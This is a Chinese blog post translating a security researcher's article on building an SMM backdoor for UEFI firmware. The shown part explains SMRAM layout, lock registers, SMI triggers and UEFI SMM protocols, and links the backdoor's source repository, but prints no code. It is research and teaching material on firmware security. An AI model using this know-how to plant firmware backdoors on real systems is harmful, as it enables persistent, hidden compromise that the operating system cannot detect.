<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/project/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/project/fontawesome/css/brands.css" rel="stylesheet">
<link href="/project/fontawesome/css/solid.css" rel="stylesheet">
<script src="/project/js/color.global.min.js" ></script>
<script src="/project/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  <title>基于UEFI平台的SMM后门构建 | Edvison&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Dmytro Oleksiuk是真的牛，早期学习UEFI安全时就是边翻译他的文章边学的。 翻得不怎么样，能看懂就行（ 原文： http:&#x2F;&#x2F;blog.cr4.sh&#x2F;2015&#x2F;07&#x2F;building-reliable-smm-backdoor-for-uefi.html">
<meta property="og:type" content="article">
<meta property="og:title" content="基于UEFI平台的SMM后门构建">
<meta property="og:url" content="https://edvison.github.io/project/2023/08/09/%E5%9F%BA%E4%BA%8EUEFI%E5%B9%B3%E5%8F%B0%E7%9A%84SMM%E5%90%8E%E9%97%A8%E6%9E%84%E5%BB%BA/index.html">
<meta property="og:site_name" content="Edvison&#39;s blog">
<meta property="og:description" content="Dmytro Oleksiuk是真的牛，早期学习UEFI安全时就是边翻译他的文章边学的。 翻得不怎么样，能看懂就行（ 原文： http:&#x2F;&#x2F;blog.cr4.sh&#x2F;2015&#x2F;07&#x2F;building-reliable-smm-backdoor-for-uefi.html">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161648498.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161658467.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161707691.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161728358.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161739308.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161757875.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161804919.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161830194.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161852270.png">
<meta property="article:published_time" content="2023-08-09T08:15:08.000Z">
<meta property="article:modified_time" content="2023-08-09T08:21:28.168Z">
<meta property="article:author" content="edvison">
<meta property="article:tag" content="UEFI">
<meta property="article:tag" content="SMM后门">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161648498.png">
  
    <link rel="alternate" href="/project/atom.xml" title="Edvison's blog" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/project/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230807175151.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/project/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>Edvison's blog </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/project/">Home</a>
    
      <a class="main-nav-link" href="/project/archives">Archives</a>
    
      <a class="main-nav-link" href="/project/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/project/atom.xml" title="RSS 订阅">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="搜索" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/project/">Home</a>
    
      <a class="nav-dropdown-link" href="/project/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/project/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/project/atom.xml" title="RSS 订阅">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230808155156.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Edvison </div>
      <div class="dot"></div>
      <div class="subtitle">flung out of space </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Edvison" title="github"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://weibo.com/u/6038772011" title="weibo"><i class="fa-brands fa-weibo"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/project/categories/UEFI%E5%8E%9F%E7%90%86/">
                UEFI原理
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/project/categories/UEFI%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8/">
                UEFI固件安全
                <div class="category-count">6</div>
            </a>
        
            <a class="category-link" href="/project/categories/MBR%E5%8E%9F%E7%90%86/">
                MBR原理
                <div class="category-count">2</div>
            </a>
        
            <a class="category-link" href="/project/categories/%E7%BF%BB%E8%AF%91/">
                翻译
                <div class="category-count">4</div>
            </a>
        
            <a class="category-link" href="/project/categories/Grub2%E5%8E%9F%E7%90%86/">
                Grub2原理
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/project/categories/IoT%E5%AE%89%E5%85%A8/">
                IoT安全
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/project/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">
                硬件安全
                <div class="category-count">4</div>
            </a>
        
            <a class="category-link" href="/project/categories/VBIOS%E4%BF%AE%E6%94%B9/">
                VBIOS修改
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">标签</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/CSM/" rel="tag">CSM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/DMA%E6%94%BB%E5%87%BB/" rel="tag">DMA攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/Grub2/" rel="tag">Grub2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/HID%E6%94%BB%E5%87%BB/" rel="tag">HID攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR/" rel="tag">MBR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR%E5%90%8E%E9%97%A8/" rel="tag">MBR后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OS-Loader/" rel="tag">OS Loader</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OVMF%E7%BC%96%E8%AF%91/" rel="tag">OVMF编译</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/PCH/" rel="tag">PCH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM/" rel="tag">SMM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E5%90%8E%E9%97%A8/" rel="tag">SMM后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">SMM漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/UEFI/" rel="tag">UEFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/VBIOS/" rel="tag">VBIOS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/pcie/" rel="tag">pcie</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4/" rel="tag">写保护</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4%E7%AA%81%E7%A0%B4/" rel="tag">写保护突破</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%8E%9F%E7%90%86/" rel="tag">原理</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8/" rel="tag">安全启动</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%BC%80%E5%8F%91%E6%9D%BF/" rel="tag">开发板</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" rel="tag">树莓派</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%94%B5%E6%BA%90%E6%95%85%E9%9A%9C/" rel="tag">电源故障</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">归档</h3>
      
      
        <a class="archive-link" href="/project/archives/2023/08 ">
          八月 2023 
          <div class="archive-count">22 </div>
        </a>
      
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">最新文章</h3>
      <ul>
        
          <a class="recent-link" href="/project/2023/08/09/Lenovo%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84SMM-callout%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Lenovo固件中的SMM callout漏洞利用" >
            <div class="recent-link-text">
              Lenovo固件中的SMM callout漏洞利用
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/%E5%88%A9%E7%94%A8DMA%E6%94%BB%E5%87%BB%E7%AA%81%E7%A0%B4UEFI%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/" title="利用DMA攻击突破UEFI安全机制" >
            <div class="recent-link-text">
              利用DMA攻击突破UEFI安全机制
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/UEFI-%E5%BC%95%E5%AF%BC%E8%84%9A%E6%9C%AC%E8%A1%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="UEFI 引导脚本表漏洞利用" >
            <div class="recent-link-text">
              UEFI 引导脚本表漏洞利用
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/%E5%9F%BA%E4%BA%8EUEFI%E5%B9%B3%E5%8F%B0%E7%9A%84SMM%E5%90%8E%E9%97%A8%E6%9E%84%E5%BB%BA/" title="基于UEFI平台的SMM后门构建" >
            <div class="recent-link-text">
              基于UEFI平台的SMM后门构建
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/P4wnP1%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/" title="P4wnP1配置与使用" >
            <div class="recent-link-text">
              P4wnP1配置与使用
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-基于UEFI平台的SMM后门构建" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        基于UEFI平台的SMM后门构建
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2023-08-09T08:15:08.000Z" itemprop="datePublished">2023-08-09</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/project/categories/%E7%BF%BB%E8%AF%91/">翻译</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            14k 词 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/SMM%E5%90%8E%E9%97%A8/" rel="tag">SMM后门</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/UEFI/" rel="tag">UEFI</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p>Dmytro Oleksiuk是真的牛，早期学习UEFI安全时就是边翻译他的文章边学的。</p>
<p>翻得不怎么样，能看懂就行（</p>
<p>原文： <a target="_blank" rel="noopener" href="http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html">http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html</a></p>
<span id="more"></span>


<p>系统管理模式（System Management Mode）显然是英特尔IA-32架构中最黑暗的角落之一。在过去的几个月里，我学习了关于SMM和为基于UEFI的平台编写SMM后门的周末项目，在本文中，我想与您分享后门的源代码并解释它是如何工作的。<br>GitHub:  <a target="_blank" rel="noopener" href="https://github.com/Cr4sh/SmmBackdoor">https://github.com/Cr4sh/SmmBackdoor</a><br>其实,最开始我的灵感来源于对英特尔SMM安全漏洞最近的研究(“<a target="_blank" rel="noopener" href="https://cansecwest.com/slides/2015/A%20New%20Class%20of%20Vulnin%20SMI%20-%20Andrew%20Furtak.pdf">A New Class of Vulnerabilities in SMI Handlers</a>”)和LegbaCore团队的(“<a target="_blank" rel="noopener" href="http://legbacore.com/Research_files/HowManyMillionBIOSWouldYouLikeToInfect_Full2.pdf">How Many Million BIOSes Would you Like to Infect?</a>“)以及决定审计我的Intel DQ77KB主板的固件，以发现类似的漏洞。<br>要对SMM代码进行逆向，需要以某种方式转储SMM的RAM，这并不容易。最明显的方法——主板固件补丁和禁用SMRAM保护让non-SMM访问代码，或利用漏洞exp，来允许读取SMRAM内容，例如boot script table漏洞(<a target="_blank" rel="noopener" href="https://www.kb.cert.org/vuls/id/976132">CERT VU #976132</a>)这是我以前博客中的UEFI漏洞描述。<br>这两种方法都有一个显著的缺点——它们都仅能适用于特定的模型，并且你可能会花费不可预测的时间将它们移植到一些新的测试平台上。为了实现更好的解决方案，我决定编写一些运行在SMM中的固件后门，并提供一个接口，允许从低权限的代码转储SMRAM，并做一些其他有用的事情。此外，我还编写了额外的后门payload，允许使用SMM magic对64位GNU&#x2F;Linux操作系统下用户模式进程进行提权。当然,这后门是研究工具而不是恶意软件,安装它,你需要有一个硬件SPI编程器并物理访问目标机器,但是就像其他研究者所示——也有可能通过适当的UEFI漏洞将这种后门武器化，并且只通过软件的方式感染运行在操作系统中的固件。<br>在研究人员中，SMM安全并不是一个新的主题，在过去的10年里，有很多关于SMM本身及其用于不同目的的出版物:</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://cs.usfca.edu/~cruse/cs630f06/duflot.pdf">“ Using CPU System Management Mode to Circumvent Operating System Security Functions “</a></li>
<li><a target="_blank" rel="noopener" href="http://phrack.org/issues/65/7.html">“ System Management Mode Hack, Using SMM for Other Purposes “</a></li>
<li><a target="_blank" rel="noopener" href="http://phrack.org/issues/66/11.html">“ A Real SMM Rootkit: Reversing and Hooking BIOS SMI Handlers “</a></li>
<li><a target="_blank" rel="noopener" href="http://www.eecs.ucf.edu/~czou/research/SMM-Rootkits-Securecom08.pdf">“ SMM Rootkits: A New Breed of OS Independent Malware “</a></li>
</ul>
<p>然而，这些研究的大部分是在传统BIOS时代完成的，如今，当PC厂商从传统BIOS换代到UEFI时，SMM的安全性与UEFI相关的方面是前所未有的。</p>
<h2 id="系统管理模式（System-Management-Mode）基础"><a href="#系统管理模式（System-Management-Mode）基础" class="headerlink" title="系统管理模式（System Management Mode）基础"></a>系统管理模式（System Management Mode）基础</h2><p>SMM是i386引入的IA-32架构的一种特殊执行模式，<a target="_blank" rel="noopener" href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html">Intel 64 and IA-32 Architectures Software Developer’s Manual</a>的第34章是关于它的设计和使用的主要信息来源：</p>
<blockquote>
<p>SMM是一种特殊用途的操作模式，用于处理系统范围内的功能，如电源管理、系统硬件控制或专为OEM设计的代码。它仅用于系统固件，而不是应用软件或通用系统软件。SMM的主要优点是它提供了一个独特且容易隔离的处理器环境，对操作系统或主控程序和软件应用程序透明地操作。</p>
</blockquote>
<p>以前，BIOS开发人员主要使用SMM进行电源管理和模拟传统设备，例如，支持PS&#x2F;2 (端口60h&#x2F;64h) 的USB键盘和鼠标。目前，它也广泛用于固件和平台安全目的。<br>为什么黑客会对SMM感兴趣?</p>
<ul>
<li>在UEFI规范中，SMM在实现平台安全机制方面发挥了非常重要的作用，该机制保护存储在主板闪存芯片中的固件 image不受恶意软件未经授权的修改。</li>
<li>SMM是隐藏OS独立和不可见的恶意软件的好地方。这种执行模式对运行在CPU上的所有其他软件，甚至OS内核或VT-x管理程序都具有极大的影响力。</li>
</ul>
<p>SMM可执行代码和数据存在于SMRAM中，当SMRAM被锁定时，它不能被操作系统或用户模式软件的代码访问。系统固件(legacy BIOS或UEFI)将SMM代码复制到SMRAM中，并在平台初始化时锁定。<br>处理器仅通过系统管理中断(SMI)切换到SMM，它将当前的进程上下文保存到SMRAM中，并开始执行SMIhandler，该handler可以退出SMM，并使用RSM指令从已保存的上下文中恢复执行。<br>SMI具有最高的优先级，不能被屏蔽。下面是关于SMIhandler执行环境最重要的事实:</p>
<ul>
<li>类似于禁用分页的16位真实地址模式。</li>
<li>CS段基址为SMRAM基址，EIP为8000h。</li>
<li>段限制设置为4 GBytes，你可以切换到保护模式或长模式来访问所有的物理内存。</li>
<li>所有I&#x2F;O端口均可用。</li>
<li>SMM代码可以读取或修改保存的进程上下文。</li>
<li>SMM代码可以设置自己的IDT和使用软件中断。</li>
</ul>
<p>如你所见，操作系统完全无法访问SMM代码，甚至无法注意到SMI在什么时候被执行。有几种方法可以生成SMI:</p>
<ul>
<li>Ring 0代码可以通过向APMC I&#x2F;O端口B2h写入一些字节，随时触发软件SMI</li>
<li>通过PCI配置空间访问的内部芯片组寄存器(SMI_EN、GEN_PMCON_1等)允许启用或禁用不同类型的硬件SMI源。</li>
<li>通过重新配置集成到CPU的高级可编程中断控制器(APIC)，可以路由硬件中断到SMM。</li>
<li>I&#x2F;O指令重启CPU功能( IA-32 Architectures Software Developer’s Manual  第34.12章)允许在任何I&#x2F;O端口上由IN或OUT处理器指令访问生成SMI。</li>
</ul>
<p>SMRAM可以位于兼容内存段(CSEG)、高内存段(HSEG)或顶部内存段(TSEG)系统内存区域。实际上，SMM和SMRAM背后的内存管理特性是硬件特有的，我使用的是Intel DQ77KB主板和Core i5-2500 CPU作为测试平台，所以，本文中的信息将根据以下数据提供:</p>
<ul>
<li>2nd Generation Intel Core Processor Family Desktop datasheet (<a target="_blank" rel="noopener" href="https://www.intel.com/content/dam/www/public/us/en/documents/datasheets/2nd-gen-core-desktop-vol-1-datasheet.pdf">volume 1</a> and <a target="_blank" rel="noopener" href="http://www.intel.com/content/dam/www/public/us/en/documents/datasheets/2nd-gen-core-desktop-vol-2-datasheet.pdf">volume 2</a>)</li>
<li><a target="_blank" rel="noopener" href="https://www.intel.com/content/dam/www/public/us/en/documents/datasheets/7-series-chipset-pch-datasheet.pdf">Intel 7 Series Chipset Family Platform Controller Hub (PCH) datasheet</a></li>
</ul>
<p>CSEG是SMRAM的一个默认区域，位于不可缓存物理内存A0000h:BFFFFh的固定地址范围(它与VGA内存重叠)。CSEG主要为传统BIOS开发人员所使用，现代系统可以使用(实际上也使用)SMRAM的其他位置:HSEG或TSEG。他们可以为SMM代码和数据提供8MB的缓存内存，即使对于相对复杂的UEFI SMM Foundation核心和驱动程序来说也足够了。<br>这里你可以看到处理器数据表的物理内存映射:</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161648498.png" alt="image-20230809161648498"></p>
<p>CSEG位于legacy地址范围内，低于第一个MB内存。你可能注意到了，图片上没有HSEG区域——我的CPU不支持它。关于TSEG——CPU有趣的事情是把它的地址存储在软件不能直接访问的内部寄存器中，这个值会按照以下方式自动计算:<br><code>TSEG ADDR = TOLUD – DSM SIZE – GSM SIZE – TSEG SIZE</code><br>…其中<code>TOLUD</code>——Top of Low Usable DRAM，<code>DSM SIZE</code>——Data of Stolen Memory的大小，<code>GSM SIZE</code>——GTT Stolen Memory的大小。</p>
<p>系统管理RAM控制寄存器(SMRAMC)控制CSEG&#x2F;HSEG&#x2F;TSEG区域的存在，并且它们的访问权限低于SMM执行模式。下面是对各个比特位的描述:</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161658467.png" alt="image-20230809161658467"></p>
<p>系统固件在平台初始化期间设置SMRAMC值，并锁定寄存器——所有字段变为只读，直到下一次完全复位。在正确配置的系统上，<code>D_LCK</code>必须为1,<code>D_OPEN</code>必须为0，这意味着SMRAM内存只能从运行在SMM中的代码中访问。<code>G_SMRAME</code>字段控制CSEG的存在，<code>C_BASE_SEG</code>负责HSEG和TSEG。在我的硬件上，<code>C_BASE_SEG</code>是只读的，预定义的值是010b。<br>还有其他寄存器应该被固件正确配置和锁定，以保护SMRAM免受各种攻击:</p>
<ul>
<li>Top of Upper Usable DRAM (<code>TOUUD</code>)， Top of Low Usable DRAM (<code>TOLUD</code>)， <code>REMAPLIMIT</code>和<code>REMAPBASE </code>寄存器用于配置物理内存映射并且必须被固件锁定，以保护SMRAM免受内存重映射攻击。更多相关信息，请参阅<a target="_blank" rel="noopener" href="http://www.ssi.gouv.fr/uploads/IMG/pdf/IT_Defense_2010_final.pdf">System Management Mode Design and Security Issues</a>和<a target="_blank" rel="noopener" href="http://www.invisiblethingslab.com/resources/bh08/part2-full.pdf">Preventing and Detecting Xen Hypervisor Subversions</a>白皮书。</li>
<li><code>TSEGMB</code>寄存器定义了应该从DMA访问中保护的内存区域的地址，固件必须配置并锁定它。 更多相关信息，请参阅<a target="_blank" rel="noopener" href="https://bromiumlabs.files.wordpress.com/2015/01/venamis_whitepaper.pdf">Attacking UEFI Boot Script</a>白皮书。</li>
<li>System Management Range Registers (SMRR)——<code>IA32_SMRR_PHYSBASE</code>和<code>IA32_SMRR_PHYSMASK</code>的一对MSR寄存器，只能通过SMM代码修改。由于HSEG和TSEG内存是可缓存的，所以必须配置SMRR，以防止SMM缓存攻击。 更多相关信息，请参阅<a target="_blank" rel="noopener" href="https://invisiblethingslab.com/resources/misc09/smm_cache_fun.pdf">Attacking SMM Memory via Intel CPU Cache Poisoning</a>白皮书。</li>
</ul>
<h2 id="UEFI-SMM基础"><a href="#UEFI-SMM基础" class="headerlink" title="UEFI SMM基础"></a>UEFI SMM基础</h2><p>统一可扩展固件接口(Unified Extensible Firmware Interface, UEFI)是一种用于PC机的标准固件架构，用于市场上的大多数现代计算机和笔记本电脑。UEFI对上面描述的SMM体系结构机制提供了很多抽象。更多关于UEFI设计的信息请参考<a target="_blank" rel="noopener" href="http://www.uefi.org/specifications">UEFI Platform Initialization Specification</a>。</p>
<p>UEFI引导序列由几个平台初始化(PI)阶段组成，每个初始化阶段都有自己的执行环境和API:</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161707691.png" alt="image-20230809161707691"></p>
<p>我在上一篇关于UEFI boot script table漏洞的文章中描述了PEI阶段，那篇文章中提到的S3恢复引导路径并没有在上图中体现。<br>当PEI core将执行传输到DXE core模块的<code>DxeMain()</code>函数时，DXE阶段开始。DXE core模块存储在主板ROM芯片上的固件文件系统(FFS) image上。DXE core从FFS加载其他DXE驱动程序，这些驱动程序可以调用EFI boot services（由<code>EFI_BOOT_SERVICES</code>结构体定义）和EFI runtime services（由<code>EFI_RUNTIME_SERVICES</code>结构体定义）。这个阶段和PEI阶段非常相似，加载的DXE驱动程序可以通过<code>EFI_BOOT_SERVICES.RegisterProtoclInterface() </code>函数注册新的UEFI协议接口，使用<code>EFI_BOOT_SERVICES.RegisterProtoclNotify()</code>获取关于某些协议注册的通知，或者使用<code>EFI_BOOT_SERVICES.LocateProtocol()</code>和<code>EFI_BOOT_SERVICES.LocateHandle()</code>查找现有的协议。当EFI OS loader调用<code>EFI_BOOT_SERVICES.ExitBootServices()</code>函数时，DXE阶段结束，该函数将控制权转移到操作系统内核。在runtime阶段，只有<code>EFI_RUNTIME_SERVICES</code>函数被用于运行操作系统。</p>
<p>SMM阶段是可选的阶段，它在DXE中启动，并与其他PI阶段并行运行到runtime阶段。Platform Initialization Specification 第4卷-系统管理模式核心接口，告诉我们SMM阶段由两个部分组成:</p>
<ul>
<li>SMRAM初始化——在DXE过程中，SMM相关驱动打开SMRAM，创建SMRAM内存映射并提供启动SMM相关驱动所需的服务，然后在启动之前关闭并锁定SMRAM。</li>
<li>SMI管理——生成SMI时，将创建驱动程序执行环境，然后检测SMI源并调用SMIhandler。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2">EDK2源码</a>有SMM协议的开源实现，但代码并不完整，因为这些协议是特定于硬件的，要获得更有用的实现，你可以查看<a target="_blank" rel="noopener" href="https://downloadcenter.intel.com/download/23197/Intel-Quark-BSP">Intel Quark Board Support Package</a>。请注意，Quark BSP只支持i386架构(Intel Quark SoC没有长模式支持)，而大多数PC的UEFI固件使用x86_64代码SMM。另外，<a target="_blank" rel="noopener" href="http://sourceforge.mirrorservice.org/e/ed/edk2/General%20Documentation/EDK%20II%20SMM%20call%20topology.pdf">“EDK II SMM call topology”</a>文档为这些开源项目提供了一个很好的演示。<br>SMM阶段开始时为几个DXE驱动程序的合作，应该实现以下UEFI协议:</p>
<ul>
<li><code>EFI_SMM_ACCESS2_PROTOCOL</code> —— 描述系统中可用的不同SMRAM区域。</li>
<li><code>EFI_SMM_CONTROL2_PROTOCOL</code> —— 用于同步发起SMI激活。</li>
<li><code>EFI_SMM_BASE2_PROTOCOL</code> —— 用于SMM驱动初始化时定位SMST (System Management Services Table)。</li>
<li><code>EFI_SMM_CONFIGURATION_PROTOCOL</code> —— 托管协议由DXE CPU驱动发起，用来指示SMRAM中哪些区域被CPU保留用于任何目的，如堆栈、保存状态或SMM入口点。</li>
<li><code>EFI_SMM_COMMUNICATION_PROTOCOL</code> —— 提供SMM外部驱动程序和SMM内部SMI handler 之间的通信方法。</li>
<li><code>EFI_DXE_SMM_READY_TO_LOCK_PROTOCOL</code> —— 托管DXE驱动发起的协议，表示SMM即将被锁定。该协议的注册通知将调用<code>EFI_SMM_ACCESS2_PROTOCOL.Lock()</code>函数来锁定SMRAM。</li>
</ul>
<p><code>EFI_SMM_ACCESS2_PROTOCOL</code>、<code>EFI_SMM_CONTROL2_PROTOCOL</code>和<code>EFI_SMM_BASE2_PROTOCOL</code>从1.0版本的平台初始化规范开始出现，它们取代了先前版本规范中的<code>EFI_SMM_ACCESS_PROTOCOL</code>、<code>EFI_SMM_CONTROL_PROTOCOL</code>和<code>EFI_SMM_BASE_PROTOCOL</code>。现在，大多数BIOS供应商都使用新的协议，但是一些旧的硬件可能只支持旧的，这意味着用于实际用途的SMM后门应该能够使用这两个协议集。<br>有三种类型的DXE阶段驱动涉及到SMM初始化:</p>
<ul>
<li>DXE驱动 —— 由DXE核心驱动加载到系统内存中的常规DXE阶段驱动程序。</li>
